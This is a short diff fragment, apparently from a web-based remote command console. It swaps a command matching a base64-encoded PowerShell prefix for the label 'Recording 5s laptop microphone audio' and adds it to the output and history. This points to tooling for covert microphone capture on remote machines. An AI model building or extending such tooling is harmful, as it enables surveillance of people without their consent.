+                               cmd.includes('JABzAGUAYwAgAD0AIAA') ? 'mic (Recording 5s laptop microphone audio...)' : cmd;
             appendOutput(displayCmd, 'cmd');
             cmdHistory.push(cmd);
             historyIdx = cmdHistory.length;
